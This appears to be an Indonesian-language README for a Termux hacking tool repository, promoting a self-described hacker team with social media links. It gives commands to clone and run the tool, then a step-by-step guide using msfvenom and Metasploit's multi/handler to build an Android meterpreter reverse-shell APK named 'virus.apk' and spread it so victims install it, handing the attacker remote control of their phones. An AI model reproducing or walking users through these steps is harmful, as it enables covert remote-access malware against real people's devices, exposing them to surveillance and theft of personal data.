# MspoitZonaredXXII
By. Mr.XXII
Team : ZONAREDXXII Security Hacker Commander
Follow Me :
Whatsapp Me : https://bit.ly/3yYoNJH
Telegram : https://bit.ly/2VDRZHD
Facebook : https://bit.ly/3AYn8pb
Instagram : https://bit.ly/3hCkH41
Blog : https://bit.ly/3r5n16I
Grup WhatsApp : https://bit.ly/3wJQfct
Youtube : https://bit.ly/3kglnhk
■■■■■■■■■■■■■■■■■■■■■■■■■

INSTALL & KERJA METASPLOIT :
$ pkg update && pkg upgrade
$ pkg install bundler
$ pkg install wget
$ pkg install ruby
$ pkg install git
$ git clone https://github.com/ZONAREDXXII/MsploitXXII.git
$ cd MsploitXXII
$ chmod +x MsploitXXII.sh
$ ./MsploitXXII.sh

CARA KERJANYA :
1. Pertama kita akan membuat payload/backdoor atau virus yang kita gunakan untuk dirimkan ke korban agar dapat akses ke HP nya.
Silahkan ketik: 
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP Kamu LPORT=8080 -o /sdcard/virus.apk

2. Cara mengetahui IP address kita ketik : ifconfig

> msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
> set lhost IP KAMU
> set lport 8080
> run
setelah itu,kita sebarkan payload yang sudah kita buat diawal tadi,agar diinstal di hp korban,anda juga bisa mencoba pada teman, saudara atau di hp sendiri.

jika ada korban yang menginstal dan menjalankan virus tersebut,kita sudah dapat mengendalikan hp korban dengan perintah-perintah yang terdapat pada Metasploit

Untuk mengetahui perintah yang dapat kita gunakan ketik help.
